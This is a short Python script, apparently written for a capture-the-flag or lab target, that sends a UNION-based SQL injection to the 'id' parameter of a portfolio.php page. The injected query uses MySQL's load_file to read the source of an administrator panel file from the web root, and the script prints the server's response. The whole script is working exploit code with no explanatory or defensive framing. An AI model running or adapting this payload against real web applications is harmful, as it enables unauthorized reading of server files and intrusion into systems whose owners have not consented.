import requests


url = "http://178.62.96.204:31116/portfolio.php?id="



print("startig..")

i = "1 union select 1,2,load_file('/var/www/html/administrat/panel.php') -- -"

r = requests.post(url+i)
print(r.text)

